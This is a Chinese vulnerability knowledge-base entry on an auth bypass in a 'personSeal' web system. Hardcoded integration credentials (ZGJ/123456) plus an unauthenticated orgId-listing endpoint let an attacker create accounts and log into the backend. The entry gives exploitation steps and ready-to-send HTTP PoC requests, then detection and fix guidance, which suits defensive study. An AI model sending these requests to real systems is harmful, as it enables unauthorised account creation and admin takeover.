---
id: web-generic-auth-hardcoded-bip-cred-orgid-user-create
title: 硬编码 BIP 对接凭据 + orgId 未授权泄露导致任意建号登录
type: scenario
domain: web
path: web/generic/auth
technique: hardcoded-bip-cred-orgid-user-create
aliases:
- BIP 硬编码凭据
- bimRemoteUser ZGJ
- UserCreateService 未授权
- QueryAllOrgIdsService 泄露 orgId
- 公章系统建号
- 对接接口硬编码账号
tags:
- web
- auth-bypass
- hardcoded-credential
- user-creation
- api
- orgid
- unauthorized
- java
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:26:37+08:00'
  notes: 已对照原文与图01-08核对：checkUnamePass 硬编码 ZGJ/123456；UserCreateService 要求 orgId 下 departmentList 非空；QueryAllOrgIdsService 用同一凭据返回 orgIdList；实测建号返回 uid 并用新账号登录成功。未验证点：新账号口令来源原文未展示；未复现 PoC。
---

## 一句话结论

系统的 BIP 对接接口用源码里写死的 `bimRemoteUser=ZGJ`、`bimRemotePwd=123456` 做“认证”，而同一认证下还有一个未授权接口返回全部合法 `orgId`；攻击者用这两个接口即可在无需任何真实账号的情况下创建新用户，再用新账号登录后台。

## 原理

- `UserCreateService`（`/api/personSeal/UserCreateService`）在创建用户前调用 `apiPersonUtils.checkUnamePass(myObject)`：它从 JSON 中取 `bimRemoteUser` 与 `bimRemotePwd`，只要分别等于字面量 `"ZGJ"` 与 `"123456"` 就返回“成功”。这本质上是把一对硬编码共享凭据当作接口鉴权，凭据随源码/安装包泄露即失效。
- 创建用户还要求 `orgId` 存在：`departmentService.getDepartmentByUID(org_id, unit_id)` 必须返回非空，`unit_id` 由系统内部固定单位 ID 或单位信息表得到。也就是说，仅知道硬编码凭据还不够，还需要一个合法组织 ID。
- `QueryAllOrgIdsService`（`/api/personSeal/QueryAllOrgIdsService`）使用同一 `checkUnamePass`，成功后调用 `querySaveDeptIdByLQ(unit_id)` 并以逗号拼接返回 `orgIdList`。该接口没有额外的会话/角色校验，正好补上缺失的 `orgId`。
- 拿到 `orgId` 后，`UserCreateService` 构造 `ZhangYinUser`，设置 `code/mobile/name/password/department_id/uid` 等字段并调用 `addPersonByApi` 写库；返回新用户 `uid`。随后用该账号走正常登录即可获得系统会话。
- 危害成立的关键是“认证凭据是静态共享值 + 组织 ID 可未授权枚举 + 建号接口直接把用户写入业务库”，三者都不需要受害者交互。

## 触发条件

- 目标暴露 `/api/personSeal/UserCreateService` 与 `/api/personSeal/QueryAllOrgIdsService`（或同类 BIP 对接接口）。
- 源码/安装包中的 `bimRemoteUser`、`bimRemotePwd` 未被修改（本例为 `ZGJ` / `123456`）。
- 系统内至少存在一个合法 `orgId`，且 `QueryAllOrgIdsService` 可返回它。
- 新建用户默认启用（请求可带 `__ENABLE__: true`）并具备登录后台的权限。
- 登录接口没有验证码、邀请、审批等额外阻断。

## 利用步骤

1. 请求 `QueryAllOrgIdsService`，带上硬编码凭据，读取响应中的 `orgIdList`。
2. 选一个 `orgId`，请求 `UserCreateService`，填入 `bimRemoteUser`/`bimRemotePwd`、`loginName`、`fullName`、`orgId` 等字段，创建用户。
3. 记录响应中的 `uid` 与创建时使用的登录名/口令（口令字段由接口内部逻辑决定，原文未展示明文来源）。
4. 用新账号调用登录接口，取得会话（Cookie/Token）。
5. 携带会话访问后台功能，确认权限；若新用户默认角色较高，直接完成后台接管。

## PoC

```http
POST /api/personSeal/QueryAllOrgIdsService HTTP/1.1
Host: target:8180
Content-Type: application/json

{
  "bimRequestId": "1",
  "bimRemotePwd": "123456",
  "bimRemoteUser": "ZGJ",
  "bimUid": "0",
  "fullName": "123",
  "orgId": "1",
  "loginName": "123123",
  "bimposition": "123"
}
```

```text
# 预期响应
{
  "bimRequestId": "1",
  "orgIdList": ["<合法 orgId>", "..."],
  "resultCode": "0",
  "message": "success"
}
```

```http
POST /api/personSeal/UserCreateService HTTP/1.1
Host: target:8180
Content-Type: application/json

{
  "bimRequestId": "1",
  "bimRemotePwd": "123456",
  "bimRemoteUser": "ZGJ",
  "bimUid": "0",
  "fullName": "123",
  "orgId": "<上一步获取的 orgId>",
  "loginName": "13888888288",
  "bimposition": "123",
  "__ENABLE__": "true"
}
```

```text
# 预期响应
{"uid":"<新用户 id>","bimRequestId":"1","resultCode":0,"message":"success"}
# 随后用新账号登录后台
```

## 变体与关联

- 变体：硬编码账号改为 `admin/admin`、`system/123456` 等默认对接凭据；字段名随厂商变化（`appId/appSecret`、`remoteUser/remotePwd`）。
- 变体：`orgId` 也可从组织列表、注册页、错误信息、前端 JS 或 Swagger 文档获取。
- 变体：建号接口允许指定 `role`/`isAdmin`/`__ENABLE__` 等字段时，可直接创建高权限账号。
- 关联：[[web-generic-auth-unauth-user-create-admin-takeover]]（无鉴权的建号接口，本条是“硬编码共享凭据 + orgId 泄露”的变体）、[[web-generic-auth-swagger-unauth-user-management]]（文档暴露辅助发现接口）、[[web-java-framework-spring-custom-auth-path-parsing-bypass]]（另一种认证过滤器绕过）。
- 边界：凭据已修改、接口加了 IP 白名单/签名/时间戳、`orgId` 无法获取、建号后默认禁用或需管理员审核时失效。

## 检测与防御

- 检测：`bimRemoteUser=ZGJ` 等固定值出现在请求体；同一来源先调 `QueryAllOrgIdsService` 再调 `UserCreateService`；短时间新建账号后立即登录；非 BIP 服务器 IP 调用对接接口。
- 修复：删除硬编码凭据，改为每租户独立的密钥 + HMAC 签名 + 时间戳/nonce，并把密钥放入配置中心/密钥管理；对接接口限制来源 IP 与 mTLS。
- 加固：`QueryAllOrgIdsService` 增加服务端鉴权与最小化返回；建号接口要求管理员审批或邀请令牌；新用户默认最小权限并审计创建/登录事件。
